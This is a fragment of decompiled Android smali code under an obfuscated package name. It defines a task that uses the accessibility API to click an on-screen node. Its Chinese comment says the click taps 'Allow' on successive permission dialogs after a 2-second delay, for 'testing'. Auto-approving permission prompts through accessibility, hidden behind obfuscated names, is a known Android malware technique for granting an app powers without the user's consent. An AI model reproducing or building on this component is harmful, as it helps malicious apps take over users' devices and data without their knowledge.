.class public final Lڝږ؁ڋ/ڼ;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# 延迟点击：权限框逐个申请时，延后 2 秒再点“允许”，方便测试时看清每个弹框。

.field private final node:Landroid/view/accessibility/AccessibilityNodeInfo;

.method public constructor <init>(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lڝږ؁ڋ/ڼ;->node:Landroid/view/accessibility/AccessibilityNodeInfo;
    return-void
.end method

.method public run()V
    .locals 2
    :try_start_0
    iget-object v0, p0, Lڝږ؁ڋ/ڼ;->node:Landroid/view/accessibility/AccessibilityNodeInfo;
    if-nez v0, :cond_0
    return-void
    :cond_0
    const/16 v1, 0x10
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method
